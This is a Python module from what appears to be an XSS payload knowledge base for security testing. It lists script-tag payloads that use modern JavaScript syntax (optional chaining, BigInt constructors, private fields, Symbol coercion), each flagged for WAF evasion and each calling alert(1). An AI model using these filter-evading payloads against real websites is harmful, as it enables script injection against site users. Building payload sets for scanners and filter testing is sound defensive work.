#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Modern JavaScript Payloads
"""

from ..models import PayloadEntry


MODERN_SYNTAX_PAYLOADS = {
    "modern_1": PayloadEntry(
        payload="<script>window?.alert?.(1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Optional chaining alert",
        tags=["optional-chaining", "modern"],
        waf_evasion=True,
        reliability="high",
    ),
    "modern_2": PayloadEntry(
        payload="<script>(null??alert)(1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Nullish coalescing alert",
        tags=["nullish-coalescing", "modern"],
        waf_evasion=True,
        reliability="high",
    ),
    "modern_3": PayloadEntry(
        payload="<script>globalThis?.['ale'+'rt']?.(1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="globalThis with optional chaining",
        tags=["globalThis", "optional-chaining"],
        waf_evasion=True,
        reliability="high",
    ),
    "modern_4": PayloadEntry(
        payload="<script>self?.['al'+'ert']?.(1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="self with optional chaining",
        tags=["self", "optional-chaining"],
        waf_evasion=True,
        reliability="high",
    ),
}

BIGINT_PAYLOADS = {
    "bigint_1": PayloadEntry(
        payload="<script>alert(1n+0n?1:0)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="BigInt in condition",
        tags=["bigint", "modern"],
        waf_evasion=True,
        reliability="high",
    ),
    "bigint_2": PayloadEntry(
        payload="<script>[BigInt][0].constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="BigInt constructor chain",
        tags=["bigint", "constructor"],
        waf_evasion=True,
        reliability="high",
    ),
}

PRIVATE_FIELD_PAYLOADS = {
    "private_1": PayloadEntry(
        payload="<script>class X{#a=alert(1)}new X()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Private field initializer XSS",
        tags=["class", "private-field"],
        waf_evasion=True,
        reliability="high",
    ),
    "private_2": PayloadEntry(
        payload="<script>class X{static #a=alert(1)}X</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Static private field XSS",
        tags=["class", "static", "private-field"],
        waf_evasion=True,
        reliability="high",
    ),
}

SYMBOL_PAYLOADS = {
    "symbol_1": PayloadEntry(
        payload="<script>({[Symbol.toPrimitive]:alert}+'')</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Symbol.toPrimitive XSS",
        tags=["symbol", "toPrimitive"],
        waf_evasion=True,
        reliability="high",
    ),
    "symbol_2": PayloadEntry(
        payload="<script>({[Symbol.toStringTag]:'',toString:alert}+'')</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Symbol.toStringTag XSS",
        tags=["symbol", "toStringTag"],
        waf_evasion=True,
        reliability="high",
    ),
}

# Combined database
JS_MODERN_DATABASE = {
    **MODERN_SYNTAX_PAYLOADS,
    **BIGINT_PAYLOADS,
    **PRIVATE_FIELD_PAYLOADS,
    **SYMBOL_PAYLOADS,
}
JS_MODERN_TOTAL = len(JS_MODERN_DATABASE)
